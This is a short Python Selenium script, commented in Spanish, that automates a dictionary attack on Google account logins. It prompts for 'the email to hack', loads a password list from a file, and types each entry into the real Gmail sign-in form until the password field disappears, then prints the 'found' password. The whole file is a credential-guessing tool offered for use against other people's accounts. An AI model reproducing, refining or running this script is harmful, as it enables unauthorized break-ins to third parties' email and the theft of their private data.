from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import NoSuchElementException
import time

# Configura las opciones de Chrome para no cerrar el navegador automáticamente
chrome_options = Options()
chrome_options.add_experimental_option("detach", True)

# Inicializa el navegador con las opciones configuradas
driver = webdriver.Chrome(options=chrome_options)

# Abre la página web con el formulario
driver.get('https://accounts.google.com/InteractiveLogin/signinchooser?cid=1&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F%3Fhl%3Des&emr=1&flowEntry=ServiceLogin&flowName=GlifWebSignIn&followup=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F%3Fhl%3Des&hl=es&ifkv=ASKXGp3IYTshxN3jfccjFVqUJMBvytJ1xJWhJLaj8CHfq8jUOehDhANFh5ABaMKCMKd7lpfqGlmB&osid=1&passive=1209600&service=mail&theme=glif')

# Encuentra los elementos del formulario y rellénalos
email = WebDriverWait(driver, 10).until(
    EC.visibility_of_element_located((By.NAME, 'identifier'))
)
email.send_keys(input("Escribe el correo para hackear: "))

# Encuentra y haz clic en el botón de enviar
boton_siguiente = driver.find_element(By.XPATH, "//span[contains(text(), 'Siguiente')]")
boton_siguiente.click()

password = WebDriverWait(driver, 10).until(
	EC.visibility_of_element_located((By.NAME, 'Passwd'))
)
with open(input("Introduce la ruta del diccionario de contraseñas: "), 'r', errors='ignore') as archivo:
    passwordsList = [linea.strip() for linea in archivo]
pos = 0
while True:
	try:
		password = WebDriverWait(driver, 10).until(
			EC.visibility_of_element_located((By.NAME, 'Passwd'))
		)
		password.send_keys(passwordsList[pos])
		# Encuentra y haz clic en el botón de enviar
		boton_siguiente = driver.find_element(By.XPATH, "//span[contains(text(), 'Siguiente')]")
		boton_siguiente.click()
		pos+=1
		time.sleep(2)		
	except NoSuchElementException:
		print(f"Contraseña encontrada!\n	La contraseña es: {passwordsList[pos-1]}")
		break

time.sleep(1)

